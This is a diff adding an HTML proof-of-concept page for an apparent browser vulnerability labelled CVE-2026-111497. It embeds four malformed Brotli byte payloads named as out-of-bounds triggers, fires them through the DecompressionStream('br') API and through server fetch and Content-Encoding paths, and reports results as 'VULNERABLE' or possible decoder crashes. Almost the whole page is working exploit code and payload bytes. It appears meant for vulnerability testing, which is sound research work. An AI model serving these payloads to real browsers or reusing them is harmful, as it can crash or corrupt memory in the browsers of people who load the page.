@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>DecompressionStream Brotli Trigger</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,system-ui,sans-serif;padding:12px;background:#0a0a0a;color:#ddd;font-size:14px}
+h1{color:#f90;font-size:1.1em;margin-bottom:4px}
+.sub{color:#888;font-size:12px;margin-bottom:12px}
+.info{background:#1a1a2a;padding:8px 10px;border-radius:6px;margin:8px 0;font-size:12px;color:#8af;line-height:1.5}
+.row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+button{background:#f90;color:#000;border:none;padding:12px 16px;border-radius:6px;font-size:14px;cursor:pointer;flex:1;min-width:100px}
+button:active{background:#c70}
+button.red{background:#e44}
+button.blue{background:#48f;color:#fff}
+button.green{background:#4a4;color:#fff}
+.r{margin:4px 0;padding:6px 10px;border-radius:4px;font-family:monospace;font-size:12px;line-height:1.4}
+.pending{background:#222;color:#888}
+.hit{background:#2a1a1a;color:#f88;border-left:3px solid #f44}
+.ok{background:#1a2a1a;color:#8f8;border-left:3px solid #4f4}
+.err{background:#2a2a1a;color:#ff8;border-left:3px solid #ff4}
+.crash{background:#2a1a2a;color:#f8f;border-left:3px solid #f4f}
+#log{margin-top:8px;font-family:monospace;font-size:11px;white-space:pre-wrap;max-height:250px;overflow-y:auto;background:#111;padding:8px;border-radius:6px;color:#777;line-height:1.4}
+h2{color:#ccc;font-size:0.95em;margin:12px 0 4px;border-bottom:1px solid #333;padding-bottom:4px}
+</style>
+</head>
+<body>
+
+<h1>CVE-2026-111497 DecompressionStream Test</h1>
+<div class="sub">Uses JavaScript DecompressionStream('br') API — works over HTTP</div>
+
+<div class="info" id="detect">Checking browser support...</div>
+
+<h2>1. Feature Detection</h2>
+<div class="row">
+<button class="blue" onclick="detectAll()">Run Detection</button>
+</div>
+<div id="detect-results"></div>
+
+<h2>2. Inline Payload Test (no server needed)</h2>
+<div class="sub">Payloads are embedded in the page — no fetch required</div>
+<div class="row">
+<button onclick="inlineTest('oob-base')">oob-base</button>
+<button onclick="inlineTest('oob-extended')">oob-extended</button>
+<button onclick="inlineTest('oob-huffman')">oob-huffman</button>
+<button onclick="inlineTest('oob-padding')">oob-padding</button>
+</div>
+<div class="row">
+<button class="red" onclick="inlineAll()">Fire ALL (inline)</button>
+</div>
+<div id="inline-results"></div>
+
+<h2>3. Server Fetch + DS Test</h2>
+<div class="sub">Fetches raw bytes from /raw/&lt;name&gt; then pipes through DS</div>
+<div class="row">
+<button class="green" onclick="fetchDS('oob-base')">fetch+DS base</button>
+<button class="green" onclick="fetchDS('oob-extended')">fetch+DS ext</button>
+</div>
+<div class="row">
+<button class="red" onclick="fetchAllDS()">Fire ALL (fetch+DS)</button>
+</div>
+<div id="fetch-results"></div>
+
+<h2>4. Direct Content-Encoding Test</h2>
+<div class="sub">Fetches /br/&lt;name&gt; with Content-Encoding: br (browser auto-decompresses)</div>
+<div class="row">
+<button onclick="directBr('oob-base')">CE:br base</button>
+<button onclick="directBr('oob-padding')">CE:br padding</button>
+</div>
+<div id="direct-results"></div>
+
+<div id="log"></div>
+
+<script>
+// Embedded payloads — no server roundtrip needed
+var PAYLOADS = {
+  "oob-base":     new Uint8Array([0x20,0x00,0x10,0x41,0x41,0x41,0xfc,0xff,0xff,0x07,0x00,0x22,0x28,0xf0,0x0b,0x60,0xf7,0xf4,0x1f,0x00,0x00,0x00]),
+  "oob-extended": new Uint8Array([0x20,0x00,0x10,0x41,0x41,0x41,0xfc,0xff,0xff,0x07,0x00,0x22,0x28,0xf0,0x0b,0x60,0xf7,0xf4,0x1f,0x00,0x00,0x00,0x00]),
+  "oob-huffman":  new Uint8Array([0x20,0x00,0x18,0x41,0x41,0x41,0xfc,0xff,0xff,0x07,0x00,0x22,0x28,0xf0,0x0b,0x60,0xf7,0xf4,0x1f,0x00,0x00,0x00]),
+  "oob-padding":  new Uint8Array([0x20,0x00,0x10,0x41,0x41,0x41,0xfc,0xff,0xff,0x0f,0x00,0x22,0x28,0xf0,0x0b,0x60,0xf7,0xf4,0x1f,0x00,0x00,0x00]),
+};
+
+var logEl = document.getElementById('log');
+
+function log(m) {
+  logEl.textContent += new Date().toISOString().slice(11,23)+' '+m+'\n';
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function show(containerId, name, cls, txt) {
+  var el = document.getElementById(containerId);
+  var div = document.getElementById(containerId+'-'+name);
+  if (!div) {
+    div = document.createElement('div');
+    div.id = containerId+'-'+name;
+    el.appendChild(div);
+  }
+  div.className = 'r '+cls;
+  div.textContent = name+': '+txt;
+}
+
+// Feature detection
+function detectAll() {
+  log('=== Feature Detection ===');
+  var info = document.getElementById('detect');
+  var results = [];
+
+  // DecompressionStream existence
+  var hasDS = typeof DecompressionStream !== 'undefined';
+  results.push('DecompressionStream: '+(hasDS?'YES':'NO'));
+  show('detect-results', 'ds', hasDS?'ok':'err', hasDS?'API available':'API NOT available');
+  log('  DecompressionStream: '+(hasDS?'available':'NOT available'));
+
+  // Brotli format support
+  if (hasDS) {
+    try {
+      var ds = new DecompressionStream('br');
+      results.push("new DS('br'): OK");
+      show('detect-results', 'br', 'ok', "new DecompressionStream('br') succeeded");
+      log("  new DecompressionStream('br'): OK");
+      // Clean up
+      try { ds.writable.getWriter().close(); } catch(e) {}
+    } catch(e) {
+      results.push("new DS('br'): FAIL - "+e.message);
+      show('detect-results', 'br', 'err', 'br format rejected: '+e.message);
+      log("  new DecompressionStream('br'): FAIL - "+e.message);
+    }
+
+    // Also test gzip for comparison
+    try {
+      var ds2 = new DecompressionStream('gzip');
+      show('detect-results', 'gzip', 'ok', "new DS('gzip') OK (comparison)");
+      try { ds2.writable.getWriter().close(); } catch(e) {}
+    } catch(e) {
+      show('detect-results', 'gzip', 'err', "DS('gzip') failed: "+e.message);
+    }
+  }
+
+  // Protocol
+  show('detect-results', 'proto', 'ok', 'Protocol: '+location.protocol+' Host: '+location.host);
+  log('  Protocol: '+location.protocol);
+
+  // User agent
+  show('detect-results', 'ua', 'ok', navigator.userAgent.slice(0, 120));
+  log('  UA: '+navigator.userAgent.slice(0, 80));
+
+  info.textContent = results.join(' | ');
+  info.style.color = hasDS ? '#8f8' : '#f88';
+}
+
+// Inline payload test — uses embedded bytes, no network
+function inlineTest(name) {
+  if (typeof DecompressionStream === 'undefined') {
+    show('inline-results', name, 'err', 'DecompressionStream not available');
+    return;
+  }
+  var payload = PAYLOADS[name];
+  if (!payload) { show('inline-results', name, 'err', 'unknown payload'); return; }
+
+  show('inline-results', name, 'pending', 'decompressing '+payload.length+'B...');
+  log('>>> inline '+name+' ('+payload.length+'B)');
+  var t0 = performance.now();
+
+  try {
+    var ds = new DecompressionStream('br');
+    var writer = ds.writable.getWriter();
+    var reader = ds.readable.getReader();
+    var chunks = [];
+    var totalBytes = 0;
+
+    // Write the malformed payload
+    writer.write(payload.slice(0)).then(function() {
+      log('  write() resolved in '+(performance.now()-t0).toFixed(0)+'ms');
+      return writer.close();
+    }).then(function() {
+      log('  close() resolved in '+(performance.now()-t0).toFixed(0)+'ms');
+    }).catch(function(e) {
+      var ms = (performance.now()-t0).toFixed(0);
+      log('  writer error ('+ms+'ms): '+e.name+': '+e.message);
+      // Don't show result here — reader may still produce output or error
+    });
+
+    // Read decompressed output
+    function pump() {
+      return reader.read().then(function(result) {
+        var ms = (performance.now()-t0).toFixed(0);
+        if (result.done) {
+          if (totalBytes > 0) {
+            show('inline-results', name, 'hit',
+              'DECODED '+totalBytes+'B ('+ms+'ms) — decoder processed malformed stream!');
+            log('  DONE: '+totalBytes+' bytes decoded — VULNERABLE');
+          } else {
+            show('inline-results', name, 'err',
+              'Stream ended, 0 bytes ('+ms+'ms) — decoder rejected or empty');
+            log('  DONE: 0 bytes — stream ended cleanly');
+          }
+          return;
+        }
+        var chunk = result.value;
+        totalBytes += chunk.length;
+        log('  chunk: '+chunk.length+'B (total: '+totalBytes+', '+ms+'ms)');
+        // Log first few bytes
+        if (chunks.length === 0 && chunk.length > 0) {
+          var hex = Array.from(chunk.slice(0, Math.min(16, chunk.length)))
+            .map(function(b){return b.toString(16).padStart(2,'0')}).join(' ');
+          log('  first bytes: '+hex);
+        }
+        chunks.push(chunk);
+        return pump();
+      }).catch(function(e) {
+        var ms = (performance.now()-t0).toFixed(0);
+        var errStr = e.name+': '+e.message;
+        if (totalBytes > 0) {
+          show('inline-results', name, 'hit',
+            totalBytes+'B decoded then error ('+ms+'ms): '+errStr);
+          log('  ERROR after '+totalBytes+'B: '+errStr+' — partial decode = VULNERABLE');
+        } else {
+          // Check if this is the expected format error
+          if (e.message && (e.message.indexOf('format') >= 0 || e.message.indexOf('corrupt') >= 0
+              || e.message.indexOf('invalid') >= 0)) {
+            show('inline-results', name, 'ok',
+              'REJECTED ('+ms+'ms): '+errStr+' — decoder caught error (possibly patched)');
+            log('  REJECTED: '+errStr+' — format error detected');
+          } else {
+            show('inline-results', name, 'err',
+              'Error 0B ('+ms+'ms): '+errStr);
+            log('  ERROR: '+errStr);
+          }
+        }
+      });
+    }
+
+    pump();
+  } catch(e) {
+    var ms = (performance.now()-t0).toFixed(0);
+    show('inline-results', name, 'crash', 'SYNC ERROR ('+ms+'ms): '+e.name+': '+e.message);
+    log('  SYNC ERROR: '+e.name+': '+e.message);
+  }
+}
+
+function inlineAll() {
+  log('=== ALL inline payloads ===');
+  var names = Object.keys(PAYLOADS);
+  names.forEach(function(name, i) {
+    setTimeout(function() { inlineTest(name); }, i * 300);
+  });
+}
+
+// Fetch raw bytes then pipe through DecompressionStream
+function fetchDS(name) {
+  if (typeof DecompressionStream === 'undefined') {
+    show('fetch-results', name, 'err', 'DecompressionStream not available');
+    return;
+  }
+
+  show('fetch-results', name, 'pending', 'fetching raw bytes...');
+  log('>>> fetch+DS '+name);
+  var t0 = performance.now();
+
+  fetch('/raw/'+name)
+    .then(function(r) {
+      if (!r.ok) throw new Error('HTTP '+r.status);
+      log('  fetched in '+(performance.now()-t0).toFixed(0)+'ms');
+      return r.arrayBuffer();
+    })
+    .then(function(buf) {
+      var raw = new Uint8Array(buf);
+      log('  raw: '+raw.length+'B');
+
+      var ds = new DecompressionStream('br');
+      var writer = ds.writable.getWriter();
+      var reader = ds.readable.getReader();
+      var total = 0;
+
+      writer.write(raw).catch(function(){});
+      writer.close().catch(function(){});
+
+      function pump() {
+        return reader.read().then(function(result) {
+          if (result.done) {
+            var ms = (performance.now()-t0).toFixed(0);
+            show('fetch-results', name, total > 0 ? 'hit' : 'err',
+              (total > 0 ? 'DECODED ' : 'Empty ')+total+'B ('+ms+'ms)');
+            log('  fetch+DS done: '+total+'B');
+            return;
+          }
+          total += result.value.length;
+          return pump();
+        }).catch(function(e) {
+          var ms = (performance.now()-t0).toFixed(0);
+          show('fetch-results', name, total > 0 ? 'hit' : 'err',
+            (total > 0 ? total+'B then ' : '')+e.name+': '+e.message+' ('+ms+'ms)');
+          log('  fetch+DS error: '+e.message);
+        });
+      }
+      return pump();
+    })
+    .catch(function(e) {
+      show('fetch-results', name, 'err', 'Fetch failed: '+e.message);
+      log('  fetch error: '+e.message);
+    });
+}
+
+function fetchAllDS() {
+  log('=== ALL fetch+DS ===');
+  Object.keys(PAYLOADS).forEach(function(name, i) {
+    setTimeout(function() { fetchDS(name); }, i * 300);
+  });
+}
+
+// Direct Content-Encoding: br test (browser auto-decompresses)
+function directBr(name) {
+  show('direct-results', name, 'pending', 'fetching /br/'+name+'...');
+  log('>>> direct CE:br '+name);
+  var t0 = performance.now();
+
+  fetch('/br/'+name)
+    .then(function(r) {
+      var ms = (performance.now()-t0).toFixed(0);
+      log('  HTTP '+r.status+' CE='+r.headers.get('content-encoding')+' ('+ms+'ms)');
+      return r.arrayBuffer().then(function(buf) {
+        var a = new Uint8Array(buf);
+        if (a.length === 0) {
+          show('direct-results', name, 'crash', 'Empty body ('+ms+'ms) — possible decoder crash');
+        } else {
+          var hex = Array.from(a.slice(0,8)).map(function(b){return b.toString(16).padStart(2,'0')}).join(' ');
+          show('direct-results', name, 'hit', a.length+'B ('+ms+'ms) first: '+hex);
+        }
+        log('  body: '+a.length+'B');
+      });
+    })
+    .catch(function(e) {
+      var ms = (performance.now()-t0).toFixed(0);
+      show('direct-results', name, 'err', 'ERROR ('+ms+'ms): '+e.message);
+      log('  error: '+e.message);
+    });
+}
+
+// Auto-detect on load
+window.onload = function() {
+  var info = document.getElementById('detect');
+  if (typeof DecompressionStream !== 'undefined') {
+    try {
+      var test = new DecompressionStream('br');
+      info.textContent = "DecompressionStream('br') SUPPORTED — ready to test";
+      info.style.color = '#8f8';
+      try { test.writable.getWriter().close(); } catch(e) {}
+    } catch(e) {
+      info.textContent = "DecompressionStream exists but 'br' rejected: "+e.message;
+      info.style.color = '#ff8';
+    }
+  } else {
+    info.textContent = "DecompressionStream NOT available on this browser";
+    info.style.color = '#f88';
+  }
+};
+</script>
+</body>
+</html>
